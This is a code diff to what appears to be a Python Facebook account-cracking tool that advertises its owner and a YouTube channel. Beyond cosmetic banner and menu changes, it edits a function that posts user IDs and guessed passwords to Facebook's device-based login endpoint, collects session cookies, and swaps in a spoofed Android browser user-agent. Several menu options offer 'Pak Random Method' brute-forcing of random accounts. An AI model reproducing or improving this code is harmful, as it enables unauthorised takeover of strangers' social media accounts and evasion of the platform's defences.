@@ -159,15 +159,15 @@ logo=("""\033[1;92m
         ##     ##    ##    ##    ##    ## 
         ##     ##     ######      ######                                                               
 \033[1;34m--------------------------------------------------
-\033[1;39m \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m AB KHANX
-\033[1;39m \033[0;92m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m◈✙◈ \033[1;32mMSS TRICKS
-\033[1;39m \033[0;93m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33mAB KHANX
-\033[1;39m \033[0;94m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;34mMSS TRICKS HOME
-\033[1;39m \033[0;95m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mFREE AND ENJOY
-\033[1;39m \033[0;96m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m1.1
+\033[1;39m \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m✙ \033[1;33m AB KHANX
+\033[1;39m \033[0;92m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m✙ \033[1;32mMSS TRICKS
+\033[1;39m \033[0;93m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m✙ \033[1;33mAB KHANX
+\033[1;39m \033[0;94m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m✙ \033[1;34mMSS TRICKS HOME
+\033[1;39m \033[0;95m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m✙ \033[0;92mFREE AND ENJOY
+\033[1;39m \033[0;96m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m✙ \033[1;31m1.1
 \033[1;34m--------------------------------------------------""")
 def linex():
-	print('\33[1;37m---------------------------------------------------')
+	print('\33[1;37m--------------------------------------------------')
 loop = 0
 oks = []
 cps = []
@@ -396,11 +396,11 @@ def ffb(ids,names,passlist):
 def rifat1():
 	os.system('clear')
 	print(logo)
-	print('\x1b[1;97m[1] Pak Random Method \x1b[1;92m[1]')
+	print('\x1b[1;97m[1] Pak Random Method (best) \x1b[1;92m[1]')
 	print('\x1b[1;97m[2] Pak Random Method \x1b[1;92m[2]')
 	print('\x1b[1;97m[3] Pak Random Method \x1b[1;92m[3]')
 	print('\x1b[1;97m[4] Pak Random Method \x1b[1;92m[4]')
-	print('\x1b[1;97m[5] Pak Random Method \x1b[1;92m[5]')
+	print('\x1b[1;97m[5] Pak Random Method (best) \x1b[1;92m[5]')
 	print('\x1b[1;97m[6] Pak Random Method \x1b[1;92m[6]')
 	print('\x1b[1;91m[7] Go to main menu')
 	linex()
@@ -840,7 +840,7 @@ def fcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+            'user-agent': 'Mozilla/5.0 (Linux; U; Android 8.0.0; en-us; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36',}
 			lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
